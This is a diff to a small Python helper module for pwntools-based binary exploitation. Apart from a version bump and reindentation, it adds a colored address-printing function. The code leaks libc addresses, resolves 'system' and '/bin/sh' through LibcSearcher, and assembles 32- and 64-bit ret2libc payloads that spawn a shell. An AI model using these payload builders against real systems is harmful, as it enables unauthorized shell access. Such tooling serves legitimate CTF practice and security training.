@@ -8,60 +8,69 @@ Pwntools-Extern Functions
 from LibcSearcher import *
 from pwn import *
 
-__version__ = '1.2'
+__version__ = '1.3'
+
 
 def leak_addr(i, io_i):
-    if i == 0:
-        address_internal = u32(io_i.recv(4))
-        return address_internal
-    if i == 1:
-        address_internal = u64(io_i.recvuntil(b'\x7f')[:6].ljust(8, b'\x00'))
-        return address_internal
-    if i == 2:
-        address_internal = u64(io_i.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
-        return address_internal
+	if i == 0:
+		address_internal = u32(io_i.recv(4))
+		return address_internal
+	if i == 1:
+		address_internal = u64(io_i.recvuntil(b'\x7f')[:6].ljust(8, b'\x00'))
+		return address_internal
+	if i == 2:
+		address_internal = u64(io_i.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
+		return address_internal
 
 
 def libc_remastered(func, addr_i):
-    libc_i = LibcSearcher(func, addr_i)
-    libc_base_i = addr_i - libc_i.dump(func)
-    sys_i = libc_base_i + libc_i.dump('system')
-    sh_i = libc_base_i + libc_i.dump('str_bin_sh')
-    return libc_base_i, sys_i, sh_i
+	libc_i = LibcSearcher(func, addr_i)
+	libc_base_i = addr_i - libc_i.dump(func)
+	sys_i = libc_base_i + libc_i.dump('system')
+	sh_i = libc_base_i + libc_i.dump('str_bin_sh')
+	return libc_base_i, sys_i, sh_i
 
 
 def libc_remastered_ol(func, addr_i):
-    libc_i = LibcSearcher(func, addr_i, online=True)
-    libc_base_i = addr_i - libc_i.dump(func)
-    sys_i = libc_base_i + libc_i.dump('system')
-    sh_i = libc_base_i + libc_i.dump('str_bin_sh')
-    return libc_base_i, sys_i, sh_i
+	libc_i = LibcSearcher(func, addr_i, online=True)
+	libc_base_i = addr_i - libc_i.dump(func)
+	sys_i = libc_base_i + libc_i.dump('system')
+	sh_i = libc_base_i + libc_i.dump('str_bin_sh')
+	return libc_base_i, sys_i, sh_i
 
 
 def Payload_32(Padding_I, system_i, arg, sh_i):
-    payload_I = Padding_I + p32(system_i) + p32(arg) + p32(sh_i)
-    return payload_I
+	payload_I = Padding_I + p32(system_i) + p32(arg) + p32(sh_i)
+	return payload_I
 
 
 def Payload_64(padding_I, system_i, sh_i, rdi_i, ret_i):
-    payload_I = padding_I + p64(ret_i) + p64(rdi_i) + p64(sh_i) + p64(system_i)
-    return payload_I
+	payload_I = padding_I + p64(ret_i) + p64(rdi_i) + p64(sh_i) + p64(system_i)
+	return payload_I
 
 
 def Payload_32_Direct(padding_I, system_i, sh_i):
-    payload_I = padding_I + p32(system_i) + p32(sh_i)
-    return payload_I
+	payload_I = padding_I + p32(system_i) + p32(sh_i)
+	return payload_I
 
 
 def Payload_64_Direct(padding_I, system_i, sh_i, ret_i):
-    payload_I = padding_I + p64(ret_i) + p64(sh_i) + p64(system_i)
-    return payload_I
+	payload_I = padding_I + p64(ret_i) + p64(sh_i) + p64(system_i)
+	return payload_I
 
 
 def debug(io):
-    gdb.attach(io)
-    pause()
+	gdb.attach(io)
+	pause()
 
 
 def get_int_addr(io, num):
-    return int(io.recv(num), 16)
+	return int(io.recv(num), 16)
+	
+	
+def show_addr(msg, addr):
+	msg = '\x1b[01;38;5;90m' + msg + '\x1b[0m'
+	hex_text = hex(addr)
+	colored_text_addr = '\x1b[01;38;5;90m' + hex_text + '\x1b[0m'
+	colored_text_sym = '\x1b[01;38;5;90m' + ': ' + '\x1b[0m'
+	print(msg + colored_text_sym + colored_text_addr)
